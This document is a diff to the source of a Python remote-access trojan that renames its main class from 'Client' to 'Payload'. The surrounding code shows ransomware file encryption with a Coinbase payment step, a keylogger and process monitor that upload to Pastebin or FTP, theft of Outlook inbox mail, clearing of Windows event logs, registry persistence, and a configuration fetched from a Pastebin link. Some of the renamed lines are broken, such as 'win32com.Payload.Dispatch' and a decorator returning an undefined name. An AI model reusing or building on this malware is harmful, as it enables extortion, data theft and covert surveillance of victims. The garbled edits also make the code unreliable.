@@ -95,25 +95,25 @@ import Crypto.Cipher.PKCS1_OAEP
 
 
 def config(*arg, **options):
-    def decorator(function):
+    def _config(function):
         @functools.wraps(function)
-        def wrapper(*args, **kwargs):
+        def _wrapper(*args, **kwargs):
             return function(*args, **kwargs)
         for k,v in options.items():
-            setattr(wrapper, k, v)
-        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
+            setattr(_wrapper, k, v)
+        _wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
         return wrapper
-    return decorator
+    return _config
 
 
 
-class Client(object):
+class Payload():
 
     _debug   = True
     _abort   = False
     _lock    = threading.Lock()
     _jobs    = Queue.Queue()
-    __name__ = 'Client'
+    __name__ = 'Payload'
 
     def __init__(self, *args, **kwargs):
         self._sysinfo = self._get_system_info()
@@ -131,15 +131,15 @@ class Client(object):
         try:
             _ = subprocess.Popen('shutdown /t 2' if os.name is 'nt' else 'shutdown 2 --poweroff --no-wall', 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_shutdown.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_shutdown.func_name, str(e)))
 
 
     @staticmethod
     def _get_id():
         try:
-            return hashlib.new('md5', Client._get_public_ip() + Client._get_mac_address()).hexdigest()
+            return hashlib.new('md5', Payload._get_public_ip() + Payload._get_mac_address()).hexdigest()
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_id.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_id.func_name, str(e)))
 
 
     @staticmethod
@@ -147,7 +147,7 @@ class Client(object):
         try:
             return sys.platform
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_platform.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_platform.func_name, str(e)))
 
 
     @staticmethod
@@ -155,7 +155,7 @@ class Client(object):
         try:
             return urllib2.urlopen('http://api.ipify.org').read()
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_public_ip.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_public_ip.func_name, str(e)))
 
 
     @staticmethod
@@ -163,7 +163,7 @@ class Client(object):
         try:
             return socket.gethostbyname(socket.gethostname())
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_private_ip.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_private_ip.func_name, str(e)))
 
 
     @staticmethod
@@ -171,7 +171,7 @@ class Client(object):
         try:
             return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_mac_address.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_mac_address.func_name, str(e)))
 
 
     @staticmethod
@@ -179,7 +179,7 @@ class Client(object):
         try:
             return int(struct.calcsize('P') * 8)
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_architecture.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_architecture.func_name, str(e)))
 
 
     @staticmethod
@@ -187,7 +187,7 @@ class Client(object):
         try:
             return socket.getfqdn(socket.gethostname())
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_device.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_device.func_name, str(e)))
 
 
     @staticmethod
@@ -195,7 +195,7 @@ class Client(object):
         try:
             return os.getenv('USER', os.getenv('USERNAME'))
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_username.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_username.func_name, str(e)))
 
 
     @staticmethod
@@ -203,7 +203,7 @@ class Client(object):
         try:
             return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_administrator.func_name, str(e)))      
+            Payload.debug("{} error: {}".format(Payload._get_administrator.func_name, str(e)))      
 
 
     @staticmethod
@@ -220,7 +220,7 @@ class Client(object):
         try:
             return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)-1))
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_random_var.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_random_var.func_name, str(e)))
 
 
     @staticmethod            
@@ -234,7 +234,7 @@ class Client(object):
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
             return ', '.join([i for i in data if i])
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_job_status.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_job_status.func_name, str(e)))
 
             
     @staticmethod
@@ -246,7 +246,7 @@ class Client(object):
                 req.headers[key] = value
             return urllib2.urlopen(req).read()
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_post_request.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_post_request.func_name, str(e)))
 
 
     @staticmethod
@@ -257,7 +257,7 @@ class Client(object):
             t.start()
             return t
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_windows_alert.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_windows_alert.func_name, str(e)))
 
 
     @staticmethod
@@ -274,7 +274,7 @@ class Client(object):
             else:
                 return bytes(source)
         except Exception as e2:
-            Client.debug("{} error: {}".format(Client._upload_imgur.func_name, str(e2)))
+            Payload.debug("{} error: {}".format(Payload._upload_imgur.func_name, str(e2)))
 
 
     @staticmethod
@@ -292,7 +292,7 @@ class Client(object):
                 _winreg.CloseKey(reg_key)
             return True
         except Exception as e:
-            Client.debug("{} error: {}".format(str(e)))
+            Payload.debug("{} error: {}".format(str(e)))
         return False
 
 
@@ -327,7 +327,7 @@ class Client(object):
             fileh.seek(0)
             return fileh
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_png_from_data.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_png_from_data.func_name, str(e)))
 
 
     @staticmethod
@@ -348,7 +348,7 @@ class Client(object):
                 else: break
             return output
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_emails_as_json.func_name, str(e)))
+            Payload.debug("{} error: {}".format(Payload._get_emails_as_json.func_name, str(e)))
             
 
     @staticmethod
@@ -373,9 +373,9 @@ class Client(object):
                     _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                 except: pass
             else:
-                Client.debug("{} error: file not found - '{}'".format(Client._get_delete.func_name, filepath))
+                Payload.debug("{} error: file not found - '{}'".format(Payload._get_delete.func_name, filepath))
         else:
-            Client.debug("{} error: expected {}, received {}".format(Client._get_delete.func_name, str, type(filepath))) 
+            Payload.debug("{} error: expected {}, received {}".format(Payload._get_delete.func_name, str, type(filepath))) 
 
 
     @staticmethod
@@ -384,14 +384,14 @@ class Client(object):
             try:
                 output = self._get_powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\\"%s\\")}"' % log)
                 if output:
-                    Client.debug(output)
+                    Payload.debug(output)
             except Exception as e:
-                Client.debug("{} error: {}".format(Client.abort.func_name, str(e)))
+                Payload.debug("{} error: {}".format(Payload.abort.func_name, str(e)))
 
 
     def _get_config(self, *args, **kwargs):
         # for debugging purposes only!
-        # TODO: move api keys to server and make requests requiring authorization on behalf of clients
+        # TODO: move api keys to server and make requests requiring authorization on behalf of Payloads
         try:
             methods = self.persistence.methods.keys()
             config  = {'api': {}, 'resources': {}, 'tasks': {}}
@@ -474,9 +474,9 @@ class Client(object):
         info = {}
         for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             value = '_get_%s' % key
-            if hasattr(Client, value):
+            if hasattr(Payload, value):
                 try:
-                    info[key] = getattr(Client, value)()
+                    info[key] = getattr(Payload, value)()
                 except Exception as e:
                     self.debug("{} error: {}".format(self._get_system_info.func_name, str(e)))
         return info
@@ -484,12 +484,12 @@ class Client(object):
     
     def _get_all_commands(self):
         commands = {}
-        for cmd in vars(Client):
-            if hasattr(vars(Client)[cmd], 'command'):
+        for cmd in vars(Payload):
+            if hasattr(vars(Payload)[cmd], 'command'):
                 try:
-                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Client, cmd).platforms, 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip()}
+                    commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Payload, cmd).platforms, 'usage': getattr(Payload, cmd).usage, 'description': getattr(Payload, cmd).func_doc.strip().rstrip()}
                 except Exception as e:
-                    Client.debug("{} error: {}".format(self._get_all_commands.func_name, str(e)))
+                    Payload.debug("{} error: {}".format(self._get_all_commands.func_name, str(e)))
         return commands
 
 
@@ -670,7 +670,7 @@ class Client(object):
                 cipher  = Crypto.Cipher.PKCS1_OAEP.new(self._session['public_key'])
                 key     = base64.b64encode(cipher.encrypt(aes_key))
                 task_id = self._task_id(self.ransom.func_name)
-                task    = {'task': task_id, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
+                task    = {'task': task_id, 'Payload': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
                 self._results[task_id] = task
                 self.debug('{} encrypted'.format(path))
                 if 'ransom' not in self._workers or not len([k for k in self._workers if 'ransom' in k if self._workers[k].is_alive()]):
@@ -764,7 +764,7 @@ class Client(object):
         try:
             pythoncom.CoInitialize()
             mode    = args[0] if len(args) else 'ftp'
-            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             return self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
@@ -775,7 +775,7 @@ class Client(object):
     def _email_search(self, string):
         try:
             pythoncom.CoInitialize()
-            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             for k,v in emails.items():
@@ -789,7 +789,7 @@ class Client(object):
     def _email_count(self, *args, **kwargs):
         try:
             pythoncom.CoInitialize()
-            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = inbox.Items
             return "\n\tEmails in Outlook inbox: %d" % len(emails)
@@ -825,7 +825,7 @@ class Client(object):
                 if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                     result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                     task_id = self._task_id(self.keylogger.func_name)
-                    task    = {'task': task_id, 'session': self._session['id'], 'client': self._sysinfo['id'], 'command': self.keylogger.func_name, 'result': result}
+                    task    = {'task': task_id, 'session': self._session['id'], 'Payload': self._sysinfo['id'], 'command': self.keylogger.func_name, 'result': result}
                     self._results[task_id] = task
                     self.keylogger.buffer.reset()
                 elif self._abort:
@@ -1511,7 +1511,7 @@ class Client(object):
                         _ = os.popen('taskkill /im %s /f' % exe if os.name is 'nt' else 'kill -9 %s' % exe).read()
                         output.update({str(p.name()): "killed"})
                     except Exception as e:
-                        Client.debug(str(e))
+                        Payload.debug(str(e))
                 return json.dumps(output)
         except Exception as e:
             self.debug("{} error: '{}'".format(self._process_kill.func_name, str(e)))
@@ -1554,7 +1554,7 @@ class Client(object):
                     try:
                         task_id = self._task_id(self._process_monitor.func_name)
                         result  = self._upload_pastebin(self.process.buffer) if 'ftp' not in args else self._Upload_ftp(self.process.buffer)
-                        self._results[task_id] = {'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
+                        self._results[task_id] = {'Payload': self._sysinfo['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
                         self.process.buffer.reset()
                     except Exception as e:
                         self.debug("{} error: {}".format(self._process_logger.func_name, str(e)))
@@ -1651,7 +1651,7 @@ class Client(object):
         while True:
             try:
                 self._session['prompt'].wait()
-                self._server_send(**{'task': '0'*64, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
+                self._server_send(**{'task': '0'*64, 'Payload': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                 self._session['prompt'].clear()
             except Exception as e:
                 self.debug("{} error: '{}'".format(self.prompt.func_name, str(e)))
@@ -1892,7 +1892,7 @@ class Client(object):
     @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
     def set(self, arg):
         """
-        set client options
+        set Payload options
         """
         try:
             target, _, opt = arg.partition(' ')
@@ -2023,7 +2023,7 @@ class Client(object):
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
         """
-        show value of a client attribute
+        show value of a Payload attribute
         """
         try:
             attribute = str(attribute)
@@ -2105,7 +2105,7 @@ class Client(object):
         if not args:
             try:
                 pythoncom.CoInitialize()
-                installed = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+                installed = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
                 return "\tOutlook is installed on this host\n\t{}".format(self.email.usage)
             except: pass
             return "Outlook not installed on this host"
@@ -2135,9 +2135,9 @@ class Client(object):
             return "\tusage: ransom <encrypt/decrypt> [path]"
         cmd, _, action = str(args).partition(' ')
         if not self._session['id']:
-            return "{} error: {}".format(Client._ransom_payment.func_name, "no session ID")
+            return "{} error: {}".format(Payload._ransom_payment.func_name, "no session ID")
         if not self._config['api'].get('coinbase'):
-            return "{} error: {}".format(Client._ransom_payment.func_name, "no target URL")
+            return "{} error: {}".format(Payload._ransom_payment.func_name, "no target URL")
         if 'payment' in cmd:
             return self._ransom_payment(self._session['id'])
         elif 'decrypt' in cmd:
@@ -2190,7 +2190,7 @@ class Client(object):
     @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
     def standby(self):
         """
-        disconnect from server but keep client alive
+        disconnect from server but keep Payload alive
         """
         try:
             self._workers[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
@@ -2336,7 +2336,7 @@ class Client(object):
                 cmd, _, method = str(args).partition(' ')
                 methods = [m for m in self.persistence.methods if sys.platform in self.persistence.methods[m]['platforms']]
                 if cmd not in ('add','remove'):
-                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
+                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
                 elif method == 'all':
                     payload = self.payload('add {}'.format(random.choice(self._config['resources']['icons'][sys.platform].keys())))
                     for method in methods:
@@ -2348,7 +2348,7 @@ class Client(object):
                     return json.dumps({method: self.persistence.methods[method]['result']})
         except Exception as e:
             self.debug("{} error: '{}'".format(self.persistence.func_name, str(e)))
-        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
+        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
 
 
     @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
@@ -2457,8 +2457,8 @@ class Client(object):
         """
         print output to console if debugging mode is enabled
         """
-        if Client._debug:
-            with Client._lock:
+        if Payload._debug:
+            with Payload._lock:
                 print(bytes(data))
 
                 
@@ -2479,7 +2479,7 @@ class Client(object):
 
     def run(self, *args, **kwargs):
         """
-        initiate client startup routine
+        initiate Payload startup routine
         """
         try:
             self.connect()
@@ -2501,5 +2501,5 @@ class Client(object):
                             
 
 if __name__ == "__main__":
-    payload = Client(config='https://pastebin.com/raw/si8MrN5X')
-    #payload.run()
+    client = Payload(config='https://pastebin.com/raw/si8MrN5X')
+    #client.run()
